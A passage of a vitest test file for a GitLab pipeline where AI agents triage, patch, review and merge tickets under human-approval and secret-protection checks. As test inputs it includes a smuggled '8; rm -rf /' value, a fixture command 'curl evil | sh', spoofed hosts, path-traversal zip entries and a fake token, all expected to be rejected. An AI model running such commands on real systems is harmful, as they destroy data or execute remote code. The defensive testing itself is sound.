import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { crc32 } from "node:zlib";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect, test, vi } from "vitest";
// targets/react_frontend.yml keeps its placeholder approver until go-live, and loadTarget refuses it.
// makeContext loads the real file, so these tests fill in an approver.
vi.mock("../config", async (importOriginal) => {
  const real = await importOriginal<typeof import("../config")>();
  return { ...real, loadTarget: (name: string) => real.loadTarget(name, { defaultApprover: "approver" }) };
});
import { extractRun, GITLAB_URL, makeContext, runStep, ticketText } from "./context";
import { reviewerPrompt } from "../agents";
import { GitLab, NotFactoryPipelineError } from "../gitlab";
import { findSecrets } from "../rules";
import * as resultSaved from "./result-saved";
import { BOT, B, fakeWorld, mrEvent, runBuildJobs, runBuildPipeline, runFinishPipeline } from "./test-helpers";

test("trivial ticket: build pipeline ends in auto-merge with no person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[]], gate: "green", jev2: "pass" }));
  expect(w.labels).toEqual(["factory_running"]);
  expect(w.finishTriggered).toBe(true);
  expect(w.cards).toHaveLength(0);
});
test("medium ticket: stops at decision with reasons on the MR and a Teams card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "medium" }, reviews: [[]], gate: "green", jev2: "pass" }));
  expect(w.labels).toEqual(["factory_needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("risk");
  expect(w.cards.map(c => c.kind)).toEqual(["needs_approval"]);
});
test("usage limit mid-run labels factory_waiting and keeps the session", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, prepare: "limit" }));
  expect(w.labels).toEqual(["factory_waiting"]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { sessionId: expect.any(String) } });
});
test("finish pipeline merges, waits for the default branch and closes the work item", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "success", defaultBranch: "master" }));
  expect(w.mainPipelineRef).toBe("master");
  expect(w.labels).toEqual(["factory_done"]);
  expect(w.closed).toBe(true);
  expect(w.cards.map(c => c.kind)).toEqual(["done"]);
});
test("injection at triage blocks, assigns a person and sends one card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { injectionYes: 0.4 } }));
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.assigned).toBe(true);
  expect(w.cards.map(c => c.kind)).toEqual(["blocked"]);
  expect(w.claudeCalls).toBe(0);
});
test("three failed review rounds block with the open findings posted", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, reviews: [[B], [B], [B]] }));
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.workItemComments.at(-1)).toContain(B.text);
});
test("a red main pipeline opens a revert MR and blocks", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "failed", defaultBranch: "master" }));
  expect(w.revertOpened).toBe(true);
  expect(w.labels).toEqual(["factory_blocked"]);
});

// Controller rulings.
test("event reads live labels: an active run on the work item stops quietly", async () => {
  const w = await runBuildPipeline(fakeWorld({ liveLabels: ["factory_ready", "factory_needs_approval"] }));
  expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "active-run" });
  expect(w.workItemComments).toHaveLength(0);
});
test("a Jev failure at triage blocks with the error and a card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: "throw" }));
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.workItemComments.at(-1)).toContain("HTTP 503");
  expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
  expect(w.claudeCalls).toBe(0);
});
test("a Jev failure at the risk check sends the change to a person with the error", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, jev2: "throw" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.labels).toEqual(["factory_needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("HTTP 503");
});
test("unreadable numstat fails the hard rules and sends the change to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, numstat: "garbage\0" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.labels).toEqual(["factory_needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("Bad numstat");
});
test("a red merge request pipeline sends the change to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, mrPipeline: "failed" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.mrComments.at(-1)).toContain("pipeline");
});
test("apply does not merge while the merge request pipeline is not green", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrPipeline: "failed" }));
  expect(w.merged).toBe(false);
  expect(w.labels).toEqual(["factory_blocked"]);
});
test("the MR closes the work item and carries the reason for a changed test", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, testChanges: "Updated the List snapshot for the spinner." }));
  expect(w.mrDescription).toContain("Closes #8");
  expect(w.mrDescription).toContain("Updated the List snapshot for the spinner.");
});
test("unclear ticket: questions are posted and the label is needs_info", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { clarity: 4 } }));
  expect(w.labels).toEqual(["factory_needs_info"]);
  expect(w.workItemComments.at(-1)).toContain("1. Which list?");
  expect(w.cards.map((c) => c.kind)).toEqual(["needs_info"]);
});

// Spec 6.7: approval and manual merge.
test("a developer's approval of a waiting MR starts the finish pipeline with the build record", async () => {
  const w = await runBuildPipeline(fakeWorld({ payload: mrEvent("approved"), liveLabels: ["factory_needs_approval"] }));
  expect(w.finishVars).toMatchObject({ FACTORY_PIPELINE: "finish", FACTORY_WORK_ITEM_IID: "8", FACTORY_MR_IID: "5", FACTORY_BUILD_PIPELINE_ID: "41" });
  expect(w.finishVars.FACTORY_SKIP_APPLY).toBeUndefined();
  expect(w.labels).toEqual(["factory_running"]);
  expect(w.claudeCalls).toBe(0);
});
test("a manual merge starts the finish pipeline with apply skipped", async () => {
  const w = await runBuildPipeline(fakeWorld({ payload: mrEvent("merge"), liveLabels: ["factory_needs_approval"] }));
  expect(w.finishVars).toMatchObject({ FACTORY_MR_IID: "5", FACTORY_SKIP_APPLY: "1" });
});
test("approvals by the bot or a non-developer, or of an MR not waiting for a person, start nothing", async () => {
  for (const o of [
    { payload: mrEvent("merge", BOT), liveLabels: ["factory_needs_approval"] },
    { payload: mrEvent("approved"), liveLabels: ["factory_needs_approval"], actorLevel: 20 },
    { payload: mrEvent("approved"), liveLabels: ["factory_running"] },
  ]) expect((await runBuildPipeline(fakeWorld(o))).finishTriggered).toBe(false);
});
test("finish after a manual merge does not merge again and verifies the merge commit", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrState: "merged", defaultBranch: "master" }), { decision: "needs_approval", skipApply: true });
  expect(w.merged).toBe(false);
  expect(w.record.steps.find((s) => s.step === "apply")?.data).toMatchObject({ sha: "manual789", skipped: true });
  expect(w.labels).toEqual(["factory_done"]);
});

// Apply's merge rule.
test("finish for an MR that needs approval and has none does not merge", async () => {
  const w = await runFinishPipeline(fakeWorld({ approvedBy: [] }), { decision: "needs_approval" });
  expect(w.merged).toBe(false);
  expect(w.labels).toEqual(["factory_blocked"]);
});
test("a bot approval does not count; a person's approval merges the reviewed commit", async () => {
  expect((await runFinishPipeline(fakeWorld({ approvedBy: [BOT] }), { decision: "needs_approval" })).merged).toBe(false);
  const w = await runFinishPipeline(fakeWorld({ approvedBy: [42] }), { decision: "needs_approval" });
  expect(w.merged).toBe(true);
  expect(w.mergedSha).toBe("head5");
});
test("the auto path merges the reviewed commit and posts the decision on the MR", async () => {
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(b.mrComments.at(-1)).toContain("without a person");
  expect(b.finishVars.FACTORY_BUILD_PIPELINE_ID).toBe("1");
  expect(b.record.steps.find((s) => s.step === "risk-check")?.data).toMatchObject({ headSha: "head5" });
  expect((await runFinishPipeline(fakeWorld())).mergedSha).toBe("head5");
});

// Re-run.
test("a re-run reuses the open MR of the factory branch", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, existingMr: true }));
  expect(w.mrOpened).toBe(false);
  expect(w.record.steps.find((s) => s.step === "precommit-gate")?.data).toMatchObject({ mrIid: 5 });
});

// Minor fixes.
test("a block after the merge reopens the work item", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "failed" }));
  expect(w.closed).toBe(false);
});
test("verify blocks when .factory.yml names a smoke test", async () => {
  const w = await runFinishPipeline(fakeWorld(), { smoke: "pnpm test:smoke" });
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.workItemComments.at(-1)).toContain("smoke");
});

// runStep, the CI job body.
const tmp = () => mkdtempSync(join(tmpdir(), "runstep-"));
test("runStep skips when an earlier job stopped the run", async () => {
  const dir = tmp();
  writeFileSync(join(dir, "stop"), "event");
  let ran = false;
  await runStep("triage", async () => ((ran = true), "next"), { dir, make: () => fakeWorld().ctx });
  expect(ran).toBe(false);
});
test("runStep saves the record and writes the stop file on a stop", async () => {
  const dir = tmp();
  const w = fakeWorld({ liveLabels: ["factory_ready", "factory_running"] });
  await runStep("event", (await import("./event")).run, { dir, make: () => w.ctx });
  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("event");
  expect(JSON.parse(readFileSync(join(dir, "record.json"), "utf8")).steps[0].step).toBe("event");
});
test("runStep blocks the work item on an unexpected error and still fails the job", async () => {
  const dir = tmp();
  const w = fakeWorld();
  w.ctx.env.workItemIid = 8;
  await expect(runStep("code-review", async () => { throw new Error("reviewer crashed"); }, { dir, make: () => w.ctx })).rejects.toThrow("reviewer crashed");
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.workItemComments.at(-1)).toContain("reviewer crashed");
  expect(existsSync(join(dir, "record.json"))).toBe(true);
});
test("finish waits for the build record, then blocks with the env work item if it never comes", async () => {
  const dir = tmp();
  let tries = 0;
  const w = fakeWorld();
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, mrIid: 5, buildPipelineId: 41, factoryProjectId: 3 };
  w.ctx.gitlab.buildRecord = async () => { tries++; throw new Error("GitLab GET failed with status 404"); };
  let ran = false;
  await expect(runStep("apply", async () => ((ran = true), "next"), { dir, make: () => w.ctx })).rejects.toThrow(/build pipeline 41/);
  expect(tries).toBeGreaterThan(1);
  expect(ran).toBe(false);
  expect(w.labels).toEqual(["factory_blocked"]);
});
test("finish loads the build record once it is uploaded", async () => {
  const dir = tmp();
  const w = fakeWorld();
  w.ctx.env = { ...w.ctx.env, buildPipelineId: 41, factoryProjectId: 3 };
  let tries = 0;
  w.ctx.gitlab.buildRecord = async () => {
    if (++tries < 3) throw new Error("GitLab GET failed with status 404");
    return { ...w.ctx.record, workItem: "from-build" };
  };
  let seen = "";
  await runStep("apply", async (ctx) => ((seen = ctx.record.workItem), "next"), { dir, make: () => w.ctx });
  expect(seen).toBe("from-build");
});

test("makeContext reads the secret files into memory and deletes them", () => {
  const dir = tmp();
  const file = (name: string, v: string) => (writeFileSync(join(dir, name), `${v}\n`), join(dir, name));
  const env = { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "k",
    FACTORY_GITLAB_TOKEN: file("gl", "glpat-x"), TEAMS_WEBHOOK_URL: file("teams", "https://t"), FACTORY_TRIGGER_TOKEN: file("trig", "tt") };
  makeContext(env, dir);
  for (const k of ["gl", "teams", "trig"]) expect(existsSync(join(dir, k))).toBe(false);
  const err = (() => { try { makeContext({ ...env, FACTORY_GITLAB_TOKEN: "glpat-raw-value" }, dir); } catch (e) { return String(e); } })();
  expect(err).toContain("must be a File type CI variable");
  expect(err).not.toContain("glpat-raw-value");
});

// A build record from another run must not be used to merge.
test("apply blocks when the build record is for another work item", async () => {
  const w = await runFinishPipeline(fakeWorld(), { workItemIid: 9 });
  expect(w.merged).toBe(false);
  expect(w.workItemComments.at(-1)).toContain("another");
});
test("apply blocks when the build record is for another merge request", async () => {
  const w = await runFinishPipeline(fakeWorld(), { mrIid: 6 });
  expect(w.merged).toBe(false);
  expect(w.labels).toEqual(["factory_blocked"]);
});
test("decision blocks instead of starting finish without a build pipeline id", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.ctx.env.pipelineId = undefined;
  await runBuildPipeline(w);
  expect(w.finishTriggered).toBe(false);
  expect(w.labels).toEqual(["factory_blocked"]);
});

test("makeContext rejects a target with no targets/<name>.yml, and a job image the target does not name", () => {
  const dir = tmp();
  const env = (o: Record<string, string>) => {
    for (const k of ["gl", "teams"]) writeFileSync(join(dir, k), "x");
    return { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", BERGET_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), ...o };
  };
  expect(() => makeContext(env({ FACTORY_TARGET: "nope" }), dir)).toThrow(/Unknown FACTORY_TARGET/);
  expect(() => makeContext(env({ FACTORY_TARGET: "../router" }), dir)).toThrow(/Unknown FACTORY_TARGET/);
  expect(() => makeContext(env({ FACTORY_TARGET: "react_frontend", CI_JOB_IMAGE: "evil/image:1" }), dir)).toThrow(/image/);
  expect(() => makeContext(env({ FACTORY_TARGET: "react_frontend", CI_JOB_IMAGE: "node:22" }), dir)).not.toThrow();
});
// Trigger callers can set any variable. Each FACTORY_* value must match its pattern, or the step does not start.
test("makeContext refuses FACTORY_* values that do not match their pattern", () => {
  const dir = tmp();
  const env = (o: Record<string, string>) => {
    for (const k of ["gl", "teams"]) writeFileSync(join(dir, k), "x");
    return { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "finish", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), ...o };
  };
  const good = { FACTORY_WORK_ITEM_IID: "8", FACTORY_MR_IID: "5", FACTORY_BUILD_PIPELINE_ID: "41", FACTORY_SKIP_APPLY: "1" };
  expect(makeContext(env(good), dir).env).toMatchObject({ workItemIid: 8, mrIid: 5, buildPipelineId: 41, skipApply: true });
  expect(() => makeContext(env({ FACTORY_WORK_ITEM_IID: "" }), dir)).not.toThrow(); // a webhook trigger has no iid
  expect(() => makeContext(env({ FACTORY_PIPELINE: "deploy" }), dir)).toThrow(/FACTORY_PIPELINE/);
  expect(() => makeContext(env({ FACTORY_PIPELINE: "" }), dir)).toThrow(/FACTORY_PIPELINE/);
  for (const k of ["FACTORY_WORK_ITEM_IID", "FACTORY_MR_IID", "FACTORY_BUILD_PIPELINE_ID"]) {
    expect(() => makeContext(env({ ...good, [k]: "8; rm -rf /" }), dir)).toThrow(new RegExp(k));
    expect(() => makeContext(env({ ...good, [k]: "1e3" }), dir)).toThrow(new RegExp(k));
  }
  expect(() => makeContext(env({ FACTORY_SKIP_APPLY: "yes" }), dir)).toThrow(/FACTORY_SKIP_APPLY/);
  // A scheduled pipeline sets FACTORY_SCHEDULE instead of FACTORY_PIPELINE, never both.
  expect(() => makeContext(env({ FACTORY_PIPELINE: "", FACTORY_SCHEDULE: "poll" }), dir)).not.toThrow();
  expect(() => makeContext(env({ FACTORY_PIPELINE: "", FACTORY_SCHEDULE: "retry" }), dir)).not.toThrow();
  expect(() => makeContext(env({ FACTORY_PIPELINE: "", FACTORY_SCHEDULE: "deploy" }), dir)).toThrow(/FACTORY_SCHEDULE/);
  expect(() => makeContext(env({ FACTORY_SCHEDULE: "poll" }), dir)).toThrow(/FACTORY_PIPELINE/);
});
test("a build record that fails the provenance check is not retried", async () => {
  const w = fakeWorld();
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, mrIid: 5, buildPipelineId: 41, factoryProjectId: 3 };
  let tries = 0;
  w.ctx.gitlab.buildRecord = async () => { tries++; throw new NotFactoryPipelineError("Pipeline 41 is not a factory build pipeline"); };
  await expect(runStep("apply", async () => "next", { dir: tmp(), make: () => w.ctx })).rejects.toThrow(/not a factory build pipeline/);
  expect(tries).toBe(1);
  expect(w.labels).toEqual(["factory_blocked"]);
});

// decision starts the finish pipeline from inside its own job, so apply can poll before that job succeeds.
test("finish waits while the decision job is still running, then loads the record", async () => {
  const w = fakeWorld();
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, mrIid: 5, buildPipelineId: 41, factoryProjectId: 3 };
  let jobPolls = 0;
  const fetchFn = (async (url: string) => {
    const path = url.replace("https://gl.example/api/v4", "");
    const body =
      path === "/projects/3/pipelines/41" ? { id: 41, source: "trigger", ref: "main", user: { id: 1 } } :
      path === "/projects/3" ? { id: 3, default_branch: "main" } :
      path === "/user" ? { id: 1 } :
      path.startsWith("/projects/3/pipelines/41/jobs") ? [{ id: 12, name: "decision", status: ++jobPolls <= 2 ? "running" : "success" }] :
      path === "/projects/3/jobs/12/artifacts/run/record.json" ? { ...w.ctx.record, workItem: "from-build" } : undefined;
    return new Response(JSON.stringify(body ?? {}), { status: body ? 200 : 404 });
  }) as unknown as typeof fetch;
  const real = new GitLab("https://gl.example", "tok", fetchFn);
  w.ctx.gitlab.buildRecord = real.buildRecord.bind(real);
  let seen = "";
  await runStep("apply", async (ctx) => ((seen = ctx.record.workItem), "next"), { dir: tmp(), make: () => w.ctx });
  expect(jobPolls).toBe(3);
  expect(seen).toBe("from-build");
});

test("makeContext accepts only the fixed GitLab host and a numeric project id", () => {
  const dir = tmp();
  const env = (o: Record<string, string>) => {
    for (const k of ["gl", "teams"]) writeFileSync(join(dir, k), "x");
    return { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), ...o };
  };
  expect(() => makeContext(env({}), dir)).not.toThrow();
  expect(() => makeContext(env({ CI_SERVER_URL: "https://evil.example" }), dir)).toThrow(/CI_SERVER_URL/);
  expect(() => makeContext(env({ CI_SERVER_URL: `${GITLAB_URL}.evil.example` }), dir)).toThrow(/CI_SERVER_URL/);
  expect(() => makeContext(env({ CI_PROJECT_ID: "3/../9" }), dir)).toThrow(/CI_PROJECT_ID/);
  expect(() => makeContext(env({ CI_PROJECT_ID: "" }), dir)).toThrow(/CI_PROJECT_ID/);
});

test("makeContext reads and deletes secret files only inside the runner's temp dir", () => {
  const dir = tmp();
  const other = tmp();
  const secret = join(other, "keep");
  writeFileSync(secret, "do not delete");
  for (const k of ["gl", "teams"]) writeFileSync(join(dir, k), "x");
  const env = { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams") };
  expect(() => makeContext({ ...env, FACTORY_GITLAB_TOKEN: secret }, dir)).toThrow(/FACTORY_GITLAB_TOKEN/);
  expect(() => makeContext({ ...env, FACTORY_GITLAB_TOKEN: `${dir}/../${other.split("/").at(-1)}/keep` }, dir)).toThrow(/FACTORY_GITLAB_TOKEN/);
  expect(existsSync(secret)).toBe(true);
});

// Task 13: poller starts and resumed runs. Both come as trigger variables with no webhook payload.
test("a poller start with no payload claims the run from live labels", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8 };
  await runBuildPipeline(w);
  expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, workItemIid: 8, actorId: 42 } });
  expect(w.finishTriggered).toBe(true);
  for (const o of [{ liveLabels: ["factory_needs_info"] }, { liveLabels: ["factory_ready"], actorLevel: 20 }]) {
    const q = fakeWorld(o);
    q.ctx.env = { ...q.ctx.env, payload: undefined, workItemIid: 8 };
    await runBuildPipeline(q);
    expect(q.record.steps.map((s) => s.step)).toEqual(["event"]);
    expect(q.record.steps[0].data).toMatchObject({ start: false });
    expect(q.labels).toEqual(o.liveLabels);
  }
});
test("a resume continues at the limited step with the saved session", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  expect(first.workItemComments.at(-1)).toContain("Waiting run: pipeline 1");
  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit", liveLabels: ["factory_waiting"] });
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
  w.ctx.gitlab.buildRecord = async () => first.record;
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual([1]);
  expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
  expect(w.claudeRuns[0]).toMatchObject({ resumeSessionId: "sess-limit" });
  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1);
  expect(w.finishTriggered).toBe(true);
  expect(w.labels).toEqual(["factory_running"]);
});
test("a resume with a forged record, a record of another work item, or no saved session blocks", async () => {
  const waitingRecord = (await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }))).record;
  const records: (() => Promise<unknown>)[] = [
    async () => { throw new NotFactoryPipelineError("Pipeline 1 is not a factory build pipeline"); },
    async () => ({ ...waitingRecord, workItem: "acme/web/react_frontend#9" }),
    async () => ({ ...waitingRecord, steps: waitingRecord.steps.slice(0, -1) }),
  ];
  for (const buildRecord of records) {
    const w = fakeWorld({ liveLabels: ["factory_waiting"] });
    w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
    w.ctx.gitlab.buildRecord = buildRecord;
    await runBuildJobs(w, tmp()).catch(() => {});
    expect(w.labels).toEqual(["factory_blocked"]);
    expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toMatch(/resume|not a factory build pipeline/);
    expect(w.claudeRuns).toHaveLength(0);
    expect(w.restored).toEqual([]);
  }
});

// Fix round 1.
const resumeWorld = (o: Parameters<typeof fakeWorld>[0], first: { record: unknown }) => {
  const w = fakeWorld({ liveLabels: ["factory_waiting"], ...o });
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
  w.ctx.gitlab.buildRecord = async () => first.record;
  return w;
};
test("a resume runs the .factory.yml commands read before the agent ran, not the restored clone's", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  const w = resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
  await runBuildJobs(w, tmp());
  expect(w.ran.length).toBeGreaterThan(0);
  expect(w.ran.some((c) => c.includes("evil"))).toBe(false);
  expect(w.ran).toContain("pnpm install --frozen-lockfile");
});
test("a resumed code review continues its round count and the saved session", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B]], fixLimit: true }));
  expect(first.labels).toEqual(["factory_waiting"]);
  expect(first.record.rounds.review).toBe(1);
  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B]] }, first);
  await runBuildJobs(w, tmp());
  expect(w.reviewsRun).toBe(2); // rounds 2 and 3 only
  expect(w.record.rounds.review).toBe(3);
  expect(w.claudeRuns[0]).toMatchObject({ resumeSessionId: "sess-limit" });
  expect(w.labels).toEqual(["factory_blocked"]);
});
test("a resume stops quietly when the item is no longer waiting, or the repo is full", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  const notWaiting = resumeWorld({ liveLabels: ["factory_running"] }, first);
  await runBuildJobs(notWaiting, tmp());
  expect(notWaiting.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-waiting" });
  expect(notWaiting.labels).toEqual(["factory_running"]);
  const full = resumeWorld({}, first);
  full.ctx.gitlab.countLabeled = async () => 1; // 4 active runs, this one included
  await runBuildJobs(full, tmp());
  expect(full.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "repo-full" });
  for (const w of [notWaiting, full]) {
    expect(w.restored).toEqual([]);
    expect(w.claudeRuns).toHaveLength(0);
    expect(w.workItemComments).toHaveLength(0);
  }
  expect(full.labels).toEqual(["factory_waiting"]);
});
test("a resume whose record cannot be read now waits for the next retry instead of blocking", async () => {
  const w = fakeWorld({ liveLabels: ["factory_waiting"] });
  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
  w.ctx.gitlab.buildRecord = async () => { throw new Error("GitLab GET failed with status 503"); };
  const dir = tmp();
  await runBuildJobs(w, dir);
  expect(w.labels).toEqual(["factory_waiting"]);
  expect(w.workItemComments).toHaveLength(0);
  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("event");
});

// A stored (not compressed) zip, written by hand so the test can hold any entry name.
function zip(files: Record<string, string>): Buffer {
  const local: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const [name, text] of Object.entries(files)) {
    const n = Buffer.from(name);
    const data = Buffer.from(text);
    const crc = crc32(data);
    const h = Buffer.alloc(30);
    h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(10, 4); h.writeUInt32LE(crc, 14);
    h.writeUInt32LE(data.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(n.length, 26);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(10, 6); c.writeUInt32LE(crc, 16);
    c.writeUInt32LE(data.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(offset, 42);
    local.push(h, n, data);
    central.push(c, n);
    offset += h.length + n.length + data.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, cd, end]);
}
test("extractRun restores run/ without the stop file and writes nothing outside run/", async () => {
  const base = tmp();
  const cwd = join(base, "job");
  mkdirSync(cwd);
  await extractRun(zip({ "run/record.json": "{}", "run/stop": "prepare-patch", "run/../x": "evil", "../y": "evil", "z": "evil" }), cwd);
  expect(readFileSync(join(cwd, "run/record.json"), "utf8")).toBe("{}");
  expect(existsSync(join(cwd, "run/stop"))).toBe(false);
  for (const p of [join(cwd, "x"), join(base, "y"), join(cwd, "z")]) expect(existsSync(p)).toBe(false);
});
test("a resume whose record is gone for good blocks with a comment and a card", async () => {
  for (const error of ["GitLab GET failed with status 404", "Pipeline 1 has no successful decision job", "Unexpected token < in JSON"]) {
    const w = fakeWorld({ liveLabels: ["factory_waiting"] });
    w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
    w.ctx.gitlab.buildRecord = async () => { throw new Error(error); };
    await runBuildJobs(w, tmp()).catch(() => {});
    expect(w.labels, error).toEqual(["factory_blocked"]);
    expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toContain(error);
  }
});

test("[skip ci] and [ci skip] never reach the commit or MR title, so the MR pipeline runs", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, title: "Fix list [SKIP CI] now [ci skip]" }));
  for (const t of [w.commitMessage, w.mrTitle]) expect(t).not.toMatch(/skip ci|ci skip/i);
  expect(w.mrTitle).toContain("Fix list");
});
test("the MR pipeline status is read for the reviewed head commit in risk-check and apply", async () => {
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(b.record.steps.find((s) => s.step === "risk-check")?.data).toMatchObject({ mrPipeline: "success" });
  const f = await runFinishPipeline(fakeWorld());
  expect(f.merged).toBe(true);
});

test("makeContext registers the secrets it holds, so no comment or push can carry them", () => {
  const dir = tmp();
  const file = (name: string, v: string) => (writeFileSync(join(dir, name), `${v}\n`), join(dir, name));
  const teams = "https://teams.example/webhook/0123456789";
  makeContext({ CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", BERGET_API_KEY: "berget-key-0123456789",
    TENSORX_API_KEY: "tensorx-key-0123456789", CLAUDE_CODE_OAUTH_TOKEN: "oauth-0123456789abcdef",
    FACTORY_GITLAB_TOKEN: file("gl", "gitlab-token-0123456789"), TEAMS_WEBHOOK_URL: file("teams", teams), FACTORY_TRIGGER_TOKEN: file("trig", "trigger-0123456789") }, dir);
  for (const v of ["berget-key-0123456789", "tensorx-key-0123456789", "oauth-0123456789abcdef", "gitlab-token-0123456789", teams, "trigger-0123456789"]) {
    expect(findSecrets(`text ${v} text`), v).toHaveLength(1);
  }
});
test("a Claude token in the diff is not pushed", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, diffText: "+const t = 'sk-ant-oat01-abcdef';" }));
  expect(w.commitMessage).toBe("");
  expect(w.labels).toEqual(["factory_blocked"]);
  expect(w.workItemComments.at(-1)).toContain("did not push");
});

// The factory's own label changes and comments come back through the webhook. They must not start a run.
test("a factory-authored label change or comment stops at event, before triage, clone or install", async () => {
  const project = { path_with_namespace: "acme/web/react_frontend" };
  const labelChange = { object_kind: "issue", user: { id: BOT }, project, object_attributes: { iid: 8 },
